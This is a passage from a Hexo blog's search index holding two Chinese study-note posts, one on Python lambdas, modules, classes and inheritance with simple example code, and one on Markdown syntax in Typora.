class="number">2</span>,c=<span class="number">3</span>) <span class="comment"># 正常</span></span><br><span class="line"><span class="comment"># 结果为6</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><ul><li><p>用<code>lambda</code>来创建匿名函数</p></li><li><p>创建出来的函数只是一个表达式，且不能访问自己参数列表以外的或全局命名空间里面的参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> 参数<span class="number">1</span>,参数<span class="number">2</span>,...参数N:表达式</span><br></pre></td></tr></table></figure></li></ul><h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><ul><li>是一个包含了所有自定义的函数和变量的文件，后缀名是<code>.py</code>，可以被别的程序引入来使用其中的函数</li><li><code>dir()</code>函数可以看到模块内定义的所有名称</li></ul><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><blockquote><p><strong><del>企业级理解</del>：</strong></p><p><strong>面向对象就是让每一个类都只做一件事，面向过程就是让一个类越来越全能，一个人做完全部的事情</strong></p><p><strong>摇(狗尾巴)——面向过程编程</strong></p><p><strong>狗.摇尾巴()——面向对象编程</strong></p><p><strong>找一个会做家务的男朋友，再找一个月薪20k的男朋友，再找一个会做饭的男朋友，最后找一个老实不花心的男朋友，不要让他们四个人同时见面——面向对象编程</strong></p><p><strong>找一个会做家务、月薪20k、会做饭、老实不花心的老公——面向过程编程</strong></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassName</span>:</span><br><span class="line">    方法<span class="number">1</span>:</span><br><span class="line">        xxxxxx</span><br><span class="line">    方法<span class="number">2</span>:</span><br><span class="line">        xxxxxx</span><br><span class="line">    属性<span class="number">1</span></span><br><span class="line">    属性<span class="number">2</span></span><br></pre></td></tr></table></figure><ul><li>类的对象可以引用类的属性和方法</li><li>类的方法与普通的函数只有一个特别的区别——必须有一个额外的<strong>第一个参数名称</strong>, 按照惯例它的名称是<code>self</code>，也可以是其他的名字</li></ul><h3 id="类的方法"><a href="#类的方法" class="headerlink" title="类的方法"></a>类的方法</h3><h4 id="一般方法"><a href="#一般方法" class="headerlink" title="一般方法"></a>一般方法</h4><p>在类的内部，用<code>def</code>定义方法，类的方法必须包含参数<code>self</code>而且必须是第一个参数，<code>self</code>表示的是类的实例（对象）</p><h4 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h4><p>用<code>@staticmethod</code>装饰不带<code>self</code>参数的方法，可以没有参数，可以直接用类名来调用</p><h4 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h4><p>用<code>@classmethod</code>装饰，默认有一个<code>cls</code>参数，可以被类和对象调用</p><h4 id="专有方法"><a href="#专有方法" class="headerlink" title="专有方法"></a>专有方法</h4><ul><li><code>__init__</code> 构造函数，在生成对象时调用</li><li><code>__del__</code> 析构函数，释放对象时使用</li><li><code>__repr__</code> 打印，转换</li><li><code>__str__</code>输出字符串</li><li><code>__setitem__</code>按照索引赋值</li><li><code>__getitem__</code>按照索引获取值</li><li><code>__len__</code>获得长度</li><li><code>__cmp__</code>比较运算</li><li><code>__call__</code>函数调用</li><li><code>__add__</code>加运算</li><li><code>__sub__</code>减运算</li><li><code>__mul__</code>乘运算</li><li><code>__truediv__</code>除运算</li><li><code>__mod__</code>求余运算</li><li><code>__pow__</code>乘方</li></ul><blockquote><p><strong>Python 3.7版本</strong></p></blockquote><h3 id="类的属性"><a href="#类的属性" class="headerlink" title="类的属性"></a>类的属性</h3><h4 id="公有属性（在类的外部可以直接访问）"><a href="#公有属性（在类的外部可以直接访问）" class="headerlink" title="公有属性（在类的外部可以直接访问）"></a>公有属性（在类的外部可以直接访问）</h4><p>跟定义变量一样</p><p><code>a = 0</code></p><h4 id="私有属性（在类的外部不可以直接访问）"><a href="#私有属性（在类的外部不可以直接访问）" class="headerlink" title="私有属性（在类的外部不可以直接访问）"></a>私有属性（在类的外部不可以直接访问）</h4><p>变量名字前面加俩下划线</p><p><code>__a = 0</code></p><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><h4 id="单继承"><a href="#单继承" class="headerlink" title="单继承"></a>单继承</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">sonClassName</span>(<span class="title class_ inherited__">fatherClassName</span>):</span><br></pre></td></tr></table></figure><ul><li>直接贴段代码例子</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#类定义</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">people</span>:</span><br><span class="line">    <span class="comment">#定义基本属性</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    age = <span class="number">0</span></span><br><span class="line">    <span class="comment">#定义私有属性,私有属性在类外部无法直接进行访问</span></span><br><span class="line">    __weight = <span class="number">0</span></span><br><span class="line">    <span class="comment">#定义构造方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,n,a,w</span>):</span><br><span class="line">        self.name = n</span><br><span class="line">        self.age = a</span><br><span class="line">        self.__weight = w</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s 说: 我 %d 岁。&quot;</span> %(self.name,self.age))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#单继承示例</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">student</span>(<span class="title class_ inherited__">people</span>):</span><br><span class="line">    grade = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,n,a,w,g</span>):</span><br><span class="line">        <span class="comment">#调用父类的构函</span></span><br><span class="line">        people.__init__(self,n,a,w)</span><br><span class="line">        self.grade = g</span><br><span class="line">    <span class="comment">#覆写父类的方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s 说: 我 %d 岁了，我在读 %d 年级&quot;</span>%(self.name,self.age,self.grade))</span><br><span class="line"> </span><br><span class="line">s = student(<span class="string">&#x27;C1everF0x&#x27;</span>,<span class="number">10</span>,<span class="number">60</span>,<span class="number">3</span>)</span><br><span class="line">s.speak()</span><br><span class="line"><span class="comment"># 结果是：C1everF0x 说: 我 10 岁了，我在读 3 年级</span></span><br></pre></td></tr></table></figure><h4 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">sonClassName</span>(father1ClassName,father2ClassName)</span><br></pre></td></tr></table></figure><ul><li>直接贴段代码例子</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#类定义</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">people</span>:</span><br><span class="line">    <span class="comment">#定义基本属性</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    age = <span class="number">0</span></span><br><span class="line">    <span class="comment">#定义私有属性,私有属性在类外部无法直接进行访问</span></span><br><span class="line">    __weight = <span class="number">0</span></span><br><span class="line">    <span class="comment">#定义构造方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,n,a,w</span>):</span><br><span class="line">        self.name = n</span><br><span class="line">        self.age = a</span><br><span class="line">        self.__weight = w</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s 说: 我 %d 岁。&quot;</span> %(self.name,self.age))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#单继承示例</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">student</span>(<span class="title class_ inherited__">people</span>):</span><br><span class="line">    grade = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,n,a,w,g</span>):</span><br><span class="line">        <span class="comment">#调用父类的构函</span></span><br><span class="line">        people.__init__(self,n,a,w)</span><br><span class="line">        self.grade = g</span><br><span class="line">    <span class="comment">#覆写父类的方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s 说: 我 %d 岁了，我在读 %d 年级&quot;</span>%(self.name,self.age,self.grade))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#另一个类，多重继承之前的准备</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">speaker</span>():</span><br><span class="line">    topic = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,n,t</span>):</span><br><span class="line">        self.name = n</span><br><span class="line">        self.topic = t</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;我叫 %s，我是一个演说家，我演讲的主题是 %s&quot;</span>%(self.name,self.topic))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#多重继承</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">sample</span>(speaker,student):</span><br><span class="line">    a =<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,n,a,w,g,t</span>):</span><br><span class="line">        student.__init__(self,n,a,w,g)</span><br><span class="line">        speaker.__init__(self,n,t)</span><br><span class="line"> </span><br><span class="line">test = sample(<span class="string">&quot;C1everF0x&quot;</span>,<span class="number">25</span>,<span class="number">80</span>,<span class="number">4</span>,<span class="string">&quot;Python&quot;</span>)</span><br><span class="line">test.speak()   <span class="comment">#方法名同，默认调用的是在括号中排前的父类的方法</span></span><br><span class="line"><span class="comment"># 结果是：我叫 C1everF0x，我是一个演说家，我演讲的主题是 Python</span></span><br></pre></td></tr></table></figure><h4 id="重写父类方法"><a href="#重写父类方法" class="headerlink" title="重写父类方法"></a>重写父类方法</h4><ul><li>可以在子类里面重写父类的方法，方法名一样</li><li>要调用父类被覆盖的方法的时候可以使用<code>super()</code>函数</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown语法</title>
      <link href="/posts/22648/"/>
      <url>/posts/22648/</url>
      
        <content type="html"><![CDATA[<h1 id="Markdown快速入门（typroa）"><a href="#Markdown快速入门（typroa）" class="headerlink" title="Markdown快速入门（typroa）"></a>Markdown快速入门（typroa）</h1><h2 id="0-内容目录"><a href="#0-内容目录" class="headerlink" title="0.内容目录"></a>0.内容目录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 内容目录语法</span><br><span class="line">[TOC]</span><br><span class="line">通常放在文档开头，以显示全文内容的目录结构</span><br></pre></td></tr></table></figure><p>[TOC]</p><h2 id="1-代码块"><a href="#1-代码块" class="headerlink" title="1.代码块"></a>1.代码块</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 代码块语法</span><br><span class="line">​```java</span><br><span class="line">三个飘号，在英文状态下</span><br><span class="line">​```shell</span><br><span class="line">// 包裹代码语法</span><br><span class="line">`代码`</span><br></pre></td></tr></table></figure><p>C语言中的<code>scanf_s</code>和<code>scanf</code>的区别是什么呢</p><h2 id="2-标题："><a href="#2-标题：" class="headerlink" title="2.标题："></a>2.标题：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 标题语法</span><br><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">### 三级标题</span><br><span class="line">#### 四级标题</span><br><span class="line">##### 五级标题</span><br><span class="line">###### 六级标题</span><br></pre></td></tr></table></figure><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><h2 id="3-字体"><a href="#3-字体" class="headerlink" title="3.字体"></a>3.字体</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 加粗</span><br><span class="line">**太阳不是一下子就下山的**</span><br><span class="line">// 代码高亮显示</span><br><span class="line">==Hello World!==</span><br><span class="line">// 删除线</span><br><span class="line">~~我是傻逼~~</span><br><span class="line">// 斜体</span><br><span class="line">*我斜了*</span><br><span class="line">// 斜体+加粗</span><br><span class="line">***我又斜又粗***</span><br><span class="line">// 上标</span><br><span class="line">我是^上标^</span><br><span class="line">// 下标</span><br><span class="line">我是~下标~</span><br><span class="line">// 下划线</span><br><span class="line">&lt;u&gt;下划线&lt;/u&gt;</span><br></pre></td></tr></table></figure><p><strong>太阳不是一下子就下山的</strong></p><p>&#x3D;&#x3D;Hello World!&#x3D;&#x3D;</p><p><del>我是傻逼</del></p><p><em>我斜了</em></p><p><em><strong>我又斜又粗</strong></em></p><p>我是^上标^</p><p>我是<del>下标</del></p><p><u>这就是下划线吗</u></p><h2 id="4-引用："><a href="#4-引用：" class="headerlink" title="4.引用："></a>4.引用：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 引用语法</span><br><span class="line">&gt; 作者：C1everF0x</span><br><span class="line">&gt;&gt; 作者：Oui0jr</span><br><span class="line">&gt;&gt;&gt; 作者：Aimerl0</span><br></pre></td></tr></table></figure><blockquote><p>作者：C1everF0x</p><p>——太阳不是一下子就下山的</p><blockquote><p>作者：Oui0jr</p><p>——位置空了总会有人去坐的</p><blockquote><p>作者：Aimerl0</p><p>——我那么多遗憾那么多期盼你知道吗</p></blockquote></blockquote></blockquote><h2 id="5-分割线："><a href="#5-分割线：" class="headerlink" title="5.分割线："></a>5.分割线：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 分割线</span><br><span class="line">---</span><br><span class="line">// 分割线2</span><br><span class="line">***</span><br><span class="line">其实都一样</span><br></pre></td></tr></table></figure><hr><hr><h2 id="6-图片插入"><a href="#6-图片插入" class="headerlink" title="6.图片插入"></a>6.图片插入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 在线图片/本地图片</span><br><span class="line">![照片名字](图片路径)</span><br><span class="line">// 感叹号英文</span><br></pre></td></tr></table></figure><p><img src="D:\hexo\cat.png" alt="猫猫"></p><h2 id="7-超链接"><a href="#7-超链接" class="headerlink" title="7.超链接"></a>7.超链接</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 超链接语法</span><br><span class="line">[超链接内容名字](路径)</span><br><span class="line">// 注脚语法</span><br><span class="line">[^注脚名字]，然后在文本结尾添加脚注，需要前后对应名字</span><br><span class="line">// 自动链接语法</span><br><span class="line">&lt;链接&gt;</span><br></pre></td></tr></table></figure><p><a href="https://c1everf0x.github.io/">C1everF0x’s Blog</a></p><p>使用Markdown<a href="Markdown%E6%98%AF%E4%B8%80%E7%A7%8D%E7%BA%AF%E6%96%87%E6%9C%AC%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80">^1</a>可以效率的书写文档、笔记，直接转换成HTML[^2]</p><p><a href="https://c1everf0x.github.io/">https://C1everF0x.github.io</a></p><h2 id="8-列表"><a href="#8-列表" class="headerlink" title="8.列表"></a>8.列表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 无序列表</span><br><span class="line">- 目录1</span><br><span class="line">- 目录2</span><br><span class="line">- 目录3</span><br><span class="line">// 有序列表</span><br><span class="line">1. 名称</span><br></pre></td></tr></table></figure><ul><li>目录1<ul><li>目录2<ul><li>目录3<ul><li>目录4</li></ul></li></ul></li></ul></li></ul><ol><li>名称</li><li>首页</li><li>分类</li></ol><h2 id="9-表格"><a href="#9-表格" class="headerlink" title="9.表格"></a>9.表格</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 表格语法</span><br><span class="line">鼠标右键-&gt;插入—&gt;表格</span><br></pre></td></tr></table></figure><table><thead><tr><th>ID</th><th>C1everF0x</th></tr></thead><tbody><tr><td>级别</td><td>废物</td></tr></tbody></table><h2 id="10-任务列表"><a href="#10-任务列表" class="headerlink" title="10.任务列表"></a>10.任务列表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- [ ] 任务一 未做任务 `- + 空格 + [ ]`</span><br><span class="line">- [x] 任务二 已做任务 `- + 空格 + [x]`</span><br></pre></td></tr></table></figure><ul><li><input disabled="" type="checkbox"> 任务一 未做任务</li><li><input checked="" disabled="" type="checkbox"> 任务二 已做任务</li></ul><h2 id="11-公式"><a href="#11-公式" class="headerlink" title="11.公式"></a>11.公式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 公式语法</span><br><span class="line">可以使用两个美元符 $$ 包裹 TeX 或 LaTeX 格式的数学公式</span><br><span class="line">$$E = mc^2$$</span><br></pre></td></tr></table></figure><p>$$<br>E &#x3D; mc^2<br>$$</p><p>[^2]:HyperText Markup Language 超文本标记语言</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
